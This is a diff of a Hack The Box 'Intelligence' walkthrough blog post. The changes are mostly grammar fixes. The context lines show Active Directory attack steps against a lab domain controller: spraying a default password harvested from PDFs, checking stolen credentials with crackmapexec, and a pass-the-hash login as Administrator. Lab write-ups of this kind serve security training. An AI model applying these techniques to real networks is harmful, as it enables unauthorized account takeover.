@@ -51,10 +51,11 @@ Since we have identified SMB services running on ports `TCP/139` and `TCP/445`, 
 
 
 SMB   10.129.235.228   445   DC   [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
+
 SMB   10.129.235.228   445   DC   [-] intelligence.htb\guest: STATUS_ACCOUNT_DISABLED
 ```
 
-Unfortunately we are unable to authenticate, however we are able to identify the name of the target host on the IP Address `10.129.235.228` as having the hostname `DC`.
+Unfortunately, we are unable to authenticate, however we are able to identify the name of the target host on the IP Address `10.129.235.228` as having the hostname `DC`.
 
 
 Returning to our `nmap` output, we also have identified a HTTP service running on port `TCP/80`. We can attempt to navigate to the website in our browser to see if we are able to access it at `10.129.235.228:80`.
@@ -207,7 +208,7 @@ After going through the files, we are able to identify two very interesting file
 ![dark mode only](/assets/img/posts/htb/machines/windows/medium/intelligence/intelligence_15.png){: .dark .w-75 .shadow .rounded-10 w='1212' h='668' }
 
 
-We can see that in the file `2020-06-04-upload.pdf`, it includes a guide for new accounts. Within it it mentions to login using a username and the default password of: `NewIntelligenceCorpUser9876`. Knowing the default password is very beneficial for us since we are able to leverage this and attempt a password spraying attack against users of the target domain `intelligence.htb`. 
+We can see that in the file `2020-06-04-upload.pdf`, it includes a guide for new accounts. Within it, it mentions to login using a username and the default password of: `NewIntelligenceCorpUser9876`. Knowing the default password is very beneficial for us since we are able to leverage this and attempt a password spraying attack against users of the target domain `intelligence.htb`. 
 
 Additionally, in the file `2020-12-30-upload.pdf`, we can see the details of an internal IT update. It appears there had been some outages with the web servers and someone by the name of `Ted` had created a script to help notify if the outage occurs again. Further, there is discussion of locking down the `service accounts`. This indicates two things:
 1. `Ted` is a technical employee, we can keep an eye out if we see anything related to this user.
@@ -257,9 +258,9 @@ Now before we write up a script that will extract the usernames, let us review w
   - With one of the 2 lines always being "/Creator (TeX)", of which we do not want to extract. 
 - We want to extract the User.Name and then append it to a file.
   - We will call the file `users.txt` for the sake of this scenario. 
-- However, there are some duplicate usernames and we do not want to append the duplicates.
+- However, there are some duplicate usernames, and we do not want to append the duplicates.
 
-With these known, we can write a script that will met these conditions. We will use python since it is easy to work with and flexible.
+With these known, we can write a script that will meet these conditions. We will use python since it is easy to work with and flexible.
 
 ```python
 #!/usr/bin/env python3
@@ -333,7 +334,7 @@ for u in new_entries:
     print("  -", u)
 ```
 
-After creating the script I noticed that the intruder results included PDF files that we had already manually extracted two usernames from. As such, I decided to delete the original `users.txt` file we created earlier since those usernames would get extracted when we run our script anyway.
+After creating the script, I noticed that the intruder results included PDF files that we had already manually extracted two usernames from. As such, I decided to delete the original `users.txt` file we created earlier since those usernames would get extracted when we run our script anyway.
 
 With our script finally put together, we can go ahead and run it by passing the intruder output file as an argument.
 
@@ -374,7 +375,7 @@ Appended 30 new username(s) to users.txt:
 ```
 
 
-After running the script, we can see that we have have successfully extracted 30 unique usernames from the intruder results file into a file called `users.txt`!
+After running the script, we can see that we have successfully extracted 30 unique usernames from the intruder results file into a file called `users.txt`!
 
 
 
@@ -414,12 +415,13 @@ Version: dev (9cfb81e) - 10/21/25 - Ronnie Flathers @ropnop
 
 We can see that we have been able to identify a username, `Tiffany.Molina`, which successfully authenticated when using the default password `NewIntelligenceCorpUser9876`.
 
-With our new found set of credentials (`Tiffany.Molina`:`NewIntelligenceCorpUser9876`), we can now return to performing further enumeration. We can start off by seeing if this user is able to authenticate to the SMB service that we identified during our `nmap` scans.
+With our newfound set of credentials (`Tiffany.Molina`:`NewIntelligenceCorpUser9876`), we can now return to performing further enumeration. We can start off by seeing if this user is able to authenticate to the SMB service that we identified during our `nmap` scans.
 
 ```bash
 0x3ds@kali $ crackmapexec smb 10.129.235.228 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' 
 
 SMB  10.129.235.228   445   DC   [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
+
 SMB  10.129.235.228   445   DC   [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
 ```
 
@@ -454,6 +456,7 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
         NETLOGON                   READ ONLY        Logon server share 
         SYSVOL                     READ ONLY        Logon server share 
         Users                      READ ONLY
+
 [*] Closed 1 connections                                                                 
 ```
 
@@ -708,6 +711,7 @@ With the new credentials (`Ted.Graves`:`Mr.Teddy`), we can go ahead and validate
 0x3ds@kali $ crackmapexec smb 10.129.235.228 -u 'Ted.Graves' -p 'Mr.Teddy'       
 
 SMB   10.129.235.228   445   DC   [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
+
 SMB   10.129.235.228   445   DC   [+] intelligence.htb\Ted.Graves:Mr.Teddy 
 ```
 
@@ -1127,6 +1131,7 @@ We can use this to authenticate to the domain controller. First let's validate t
 0x3ds@kali $ crackmapexec smb 10.129.235.228 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3'
 
 SMB   10.129.235.228   445    DC   [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
+
 SMB   10.129.235.228   445    DC   [+] intelligence.htb\Administrator:9075113fe16cf74f7c0f9b27e882dad3 (Pwn3d!)
 ```
 
